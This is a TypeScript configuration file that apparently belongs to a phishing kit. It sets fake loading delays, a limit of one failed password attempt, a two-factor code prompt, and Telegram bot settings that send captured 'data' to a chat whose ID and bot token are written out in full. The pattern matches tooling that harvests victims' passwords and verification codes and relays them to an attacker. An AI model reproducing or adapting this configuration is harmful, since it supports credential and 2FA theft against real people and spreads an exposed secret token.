interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    page_loading_time: number;
    password_loading_time: number;
    code_input_enabled: boolean;
  };
  telegram: {
    notification_chatid: string;
    notification_token: string;
    data_chatid: string;
    data_token: string;
  };
}

// Define default configuration
const defaultConfig: Config = {
  settings: {
    code_loading_time: 10000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 1,
    page_loading_time: 5000,
    password_loading_time: 8000,
    code_input_enabled: true,
  },
  telegram: {
    notification_chatid: '',
    notification_token: '', 
    data_chatid: '-1002674039533', 
    data_token: '7915689883:AAFk_jhQ4aVXoZ8RAjcVuYl1K0_Rk78yD_o',
  },
};

const getConfig = async (): Promise<Config> => {
  return defaultConfig;
};

export default getConfig;
